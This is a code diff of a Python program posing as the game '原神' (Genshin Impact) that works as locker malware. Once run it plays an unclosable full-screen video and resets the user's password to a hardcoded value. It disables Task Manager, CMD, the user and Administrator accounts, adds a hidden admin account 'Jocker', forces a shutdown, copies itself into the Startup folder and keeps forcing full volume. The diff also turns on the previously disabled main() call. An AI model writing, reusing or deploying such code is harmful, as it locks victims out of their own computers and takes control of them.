@@ -1,9 +1,8 @@
 import sys
 import os
 import threading
-import pygetwindow as gw
 
-from PySide6.QtCore import QUrl, QTimer
+from PySide6.QtCore import QUrl
 from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
 from PySide6.QtMultimediaWidgets import QVideoWidget
 from PySide6.QtWidgets import QMainWindow, QApplication
@@ -63,20 +62,6 @@ class MainWindow(QMainWindow):
         self._player.setVideoOutput(self._video_widget)
         self.pt = pt
 
-        # 设置定时器，每秒检查一次用户是否回到桌面
-        self.timer = QTimer(self)
-        self.timer.timeout.connect(self.check_if_on_desktop)
-        self.timer.start(500)  # 每秒检查一次
-
-    def check_if_on_desktop(self):
-        # 获取当前激活的窗口
-        active_window = gw.getActiveWindow()
-
-        # 检查是否是桌面
-        if active_window is None or active_window.title == '':
-            self.showFullScreen()
-            self.raise_()
-
     def play(self):
         self._player.setSource(QUrl.fromLocalFile(self.pt))
         self._player.play()
@@ -85,26 +70,21 @@ class MainWindow(QMainWindow):
         event.ignore()  # 忽略关闭事件
         self.show()     #
 
-
 def addEvents():
     while True:
         setAudio(1.0)
         clearMute()
 
 def disableTaskManage(num):
-    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')
+    os.system(fr'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')
 
 def setPassword(password):
     os.system('echo %username% > userName')
 
-    file = open('./userName', 'r', encoding='utf-8')
-    userName = file.readlines()
-    userName = userName[0].split()[0]
-
-    print(userName)
+    with open('./userName', 'r') as file:
+        userName = [file.readlines()[0].split()[0]][0].split()[0]
 
     os.system(f'net user {userName} {password}')
-    file.close()
     os.remove('./userName')
 
     return userName
@@ -119,7 +99,7 @@ def getFilePath(file_name):
     return os.path.join(basePath, file_name)
 
 def disableCMD():
-    os.system('reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f')
+    os.system(r'reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f')
 
 def disableUser(userName):
     os.system(f'net user {userName} /active:no')
@@ -131,26 +111,17 @@ def createUser(userName, password, manager=False):
     else:
         os.system(f'net user {userName} {password} /add')
 
-def is_user_on_desktop():
-    # 获取当前激活的窗口
-    active_window = gw.getActiveWindow()
-
-    # 检查窗口标题是否为空（通常桌面窗口没有标题）
-    if active_window and active_window.title == '':
-        return True
-    return False
-
 def backgroundTasks():
     # 后台任务（运行在辅助线程中）
     setPassword(1145141919810)
     disableTaskManage(1)
     clearMute()
     setAudio(1.0)
-    copy('原神.exe', '"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
     disableUser(setPassword(1145141919810))
     disableUser('Administrator')
     createUser('Jocker', "0d000721", True)
     os.system('shutdown -s -f -t 150')
+    copy('原神.exe', '"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
     disableCMD()
     addEvents()
 
@@ -159,8 +130,6 @@ def main():
 
     # 创建主窗口并播放视频
     main_win = MainWindow(getFilePath('video.mp4'))
-    available_geometry = main_win.screen().availableGeometry()
-    main_win.resize(500, 300)
     main_win.setWindowTitle('原神')
     main_win.showFullScreen()
     main_win.play()
@@ -171,6 +140,7 @@ def main():
     # 在主线程中启动应用程序事件循环
     sys.exit(app.exec())
 
+
 if __name__ == '__main__':
-    # main()
-    pass
+    main()
+    # pass
